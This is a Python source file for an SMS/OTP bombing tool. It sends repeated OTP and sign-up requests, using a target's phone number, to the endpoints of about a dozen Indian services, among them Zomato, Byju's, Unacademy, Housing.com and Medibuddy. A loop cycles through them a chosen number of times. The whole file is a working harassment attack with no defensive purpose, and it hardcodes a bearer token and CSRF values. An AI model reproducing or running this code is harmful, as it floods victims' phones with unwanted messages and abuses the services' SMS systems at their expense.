import requests,time,json

def mywalletly(number):
    data={
        "0": {
            "json": {
                "number": number
            }
        }
    }
    url="https://www.mywalletly.com/api/trpc/auth.sendOtp?batch=1"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True

def eatclub(number):
    url="https://accounts.box8.co.in/customers/sign_up?origin=eatClub"
    data={"phone_no":number,"name":"safdgrsfh","email":"sjbrf@gmail.com","password":"dfgesdhf^frhds"}
    headers={
        "Authorization":"Bearer eyJraWQiOiIxZWQ1ZDFiNjI1NDY0MmFlOWEyZGU2NDQzZWZlZmI2Y2I4OTRkMjAwNjU0NGUzYzljOWE3N2JkM2UwYzkyNThhIiwiYWxnIjoiUlMyNTYifQ.eyJpYXQiOjE3MDY4NzYyNzQsImV4cCI6MTcwNzAwNjYwMCwic3NpZCI6IjFkMGViNjUwLWQ3NjQtNGY1ZC04OGRlLTkxYmU3NmZmYmU5ZDE3MDY4NzYyNzQiLCJhY2NfdHlwZSI6IkFub255bW91c0FjY291bnQiLCJwbGF0Zm9ybSI6IndlYiIsImRldmljZV9pZCI6Imk4Y2s4cXhnLTY4cWoteDJ6cC1leW1qLWV3YTFobzJoOHBsbSIsImJyYW5kX2lkIjoxOSwiYXVkIjoiY3VzdG9tZXIiLCJpc3MiOiJhY2NvdW50cy5ib3g4LmNvLmluIn0.F8i9yUaS3uxLup5tq6SsMQ45sk6FoEPJefUUQTT4kgT1e19El6_eggRnHB8kNHTkOzKtDcs69pBaXc_bOKGLOJHNE-Wa8Jwu7O8c1g3MM3CzS1qaOmLLxk-s9KWkOFN-sB9TgeSBJEI6L_UaIgvkRaHT_TaYyGJUpBls88WhIcLEyiZARKDfJr324rx3ZefC_bp7RZHVnfpAUFxDC-oOFbrFdPESq-Ki1-FmKGB-6B8pqQ0EOraC8x5ZEllaQslzV829za2vm5dqdHyOkmkKqP_mftfItnnSVu01zOXLpwvkDzQLOcs3vJ60-bw3JCOmX7SSXzPvKwDivQsklNRhYskV0StS12UT7R0dbCDTOsGed4hnsbmz4BUsG3sKkTxSTBnWwZOaEBLm7KyxjhNy1UR6wcyLpQv_fzZ6TKI5I93cEWnFn8QYPSiA8X5iZvLichvoI3Wgwhga9L-kn4sz8fqHCMHA5vQ0CjGS4kQVBdiHVX-9psfspcb3s8OUAcN_S3T2qySeUa1-rAr-s1QON9KU96wU3Ug8p4M-NTBv-kFyVDs4PnUrb4FUSy4w8RRIo45D7cuJ9hKBJJDF__63601lCpCAHLpai9w-K-eJaQ1WmxuXR57ATdscAhr8638Ksi7E8P15YwFNXRK3HtWjleoicPbOMol7WFIchmupjtc",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"    
    }
    response = requests.post(url=url,json=data,headers=headers)
    data=json.loads(response.text)
    if(str(data['meta']['code'])=='200'):
        url="https://accounts.box8.co.in/customers/change_phone?origin=eatClub"
        response1 = requests.post(url=url,json=data,headers=headers)
        if(response1.status_code==200):
            return True
    if(response.status_code==200):
        return True
    
def infinitylearn(number):
    data={
    "isdCode": "+91",
    "phone": number,
    "whatsappConsent": "true",
    "firstName": "wgsf",
    "lastName": "gdsgdfh",
    "gradeId": 16
    }
    headers = { 
            "X-Tenant":"infinitylearn",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    }
    url="https://api.infinitylearn.com/api/authentication/generateOTP"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==200:
        return True

def my11circle(number):
    data={
    "mobile": number,
    "deviceId": "62d894e6-3f80-436a-83cb-b593bc8ccf39",
    "deviceName": "",
    "refCode": "",
    "isPlaycircle": "false"
    }
    url="https://www.my11circle.com/api/fl/auth/v3/getOtp"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True

        
def housing(number):
    data={
    "query": "\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n    ) {\n      success\n      message\n    }\n  }\n",
    "variables": {
    "phone": number,
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    }
    url="https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
        
def zomato(number):
    data={"country_id": "1",
    "number": number,
    "type": "initiate", 
    "csrf_token": "e5b0e17377353e713fdc3c1ab1169426",
    "lc": "cfcc53585be646e8adefde5b8604997e",
    "verification_type": "sms"
    }
    url="https://accounts.zomato.com/login/phone"
    request= requests.post(url,data=data)
    if request.status_code==200:
        return True
    
def fantv(number):
    data={
    "mobile": number,
    "phoneCountryCode": "+91",
    "userId": "6550db1080d1ecd4def1a7f1"
    }
    url="https://admin.artistfirst.in/v1/auth/login-signup"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
    
def byjus(number):
    data={
    "phone": f"+91-{number}",
    "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
    }
    url="https://identity.tllms.com/api/request_otp"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
    
def netmeds(number):
    url=f"https://www.netmeds.com/mst/rest/v1/id/details/{number}"
    request= requests.get(url)
    if request.status_code==400:
        return True
    
def unacademy(number):
    data={
    "phone": number,
    "country_code": "IN",
    "otp_type": 1,
    "email": "",
    "send_otp": "true",
    "is_un_teach_user": "false"
    }
    headers = { 
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    url="https://unacademy.com/api/v3/user/user_check/?enable-email=true"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==400:
        return True

def medibuddy(number):
    data={
    "source": "medibuddyInWeb",
    "platform": "medibuddy",
    "phonenumber": number,
    "flow": "Retail-Login-Home-Flow",
    "idealLoginFlow": "false",
    "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
    "mbUserId": "null"
    }
    headers = { 
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    url="https://loginprod.medibuddy.in/unified-login/user/register"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==400:
        return True

def bbq(number):
    url='https://www.barbequenation.com/getin?_wrapper_format=drupal_modal&ajax_form=1&_wrapper_format=drupal_ajax'
    data={
    "form_build_id": "form-d1w2n_A5xeFvzM97cWpg0meHNUqf4u8vsLY15j3O5RM",
    "form_id": "bbq_signup_form",
    "step1[title]": "Mr",
    "step1[user_name]": "fds",
    "step1[country_code]": "+91",
    "step1[mobile_number]": number,
    "_triggering_element_name": "op",
    "_triggering_element_value": "Next",
    "_drupal_ajax": "1",
    "ajax_page_state[theme]": "bbq_nation",
    "ajax_page_state[theme_token]":"",
    "ajax_page_state[libraries]": "addtoany/addtoany.front,bbq_blocks/bbq-blocks,bbq_nation/booking,bbq_nation/bootstrap,bbq_nation/delivery,bbq_nation/fcm,bbq_nation/global-styling,bbq_nation/lazyload-images,bbq_nation/moment-js,bbq_nation/notification-styling,bbq_nation/promotions,bbq_nation/voucher-checkout,better_local_tasks/local-tasks,classy/base,classy/messages,classy/node,core/internal.jquery.form,core/normalize,paragraphs/drupal.paragraphs.unpublished,social_auth/auth-icons,social_media_links/social_media_links.theme,system/base,views/views.module"
    }
    request=requests.post(url,data=data)
    if request.status_code==200:
        return True


def main(number,times,atime):
    i=0
    stime=atime/1000
    while i<times:
        if i<times:
            if mywalletly(number):
                i=i+1
                print(f"sms sent successful {i} to {number}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if infinitylearn(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if my11circle(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if housing(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if zomato(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if fantv(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if netmeds(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if unacademy(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if medibuddy(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if byjus(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if bbq(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        if i<times:
            if eatclub(number):
                i=i+1
                time.sleep(stime)
        else:
            break
        